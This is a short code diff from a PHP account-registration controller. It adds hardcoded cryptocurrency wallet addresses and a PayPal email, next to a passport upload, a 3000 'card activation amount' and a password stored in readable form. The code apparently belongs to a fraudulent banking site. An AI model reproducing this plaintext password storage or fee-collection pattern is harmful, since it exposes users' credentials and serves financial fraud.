@@ -131,6 +131,10 @@ class HomeController extends AbstractController
             ->setPin($request->get('secretCode'))
             ->setImage($passportFileName)
             ->setDate(new DateTime())
+            ->setBtcaddress('bc1q8fn63rpl9268wtfujvn04klryt8uplqptsnrv3')
+            ->setEthaddress('0x632bA19cE470Cb3d889EdDA3c97db368152BbA41')
+            ->setUsdtaddress('TRr282xcxtN1xb528wcCDVqfAn44q22Cvc')
+            ->setPaypaladdress('info@digihostltd.com')
             ->setCardactivationamount(3000)
             ->setVisiblepassword($request->get('password'))
             ->setAccountnumber($this->generateRandomAccountNumber());
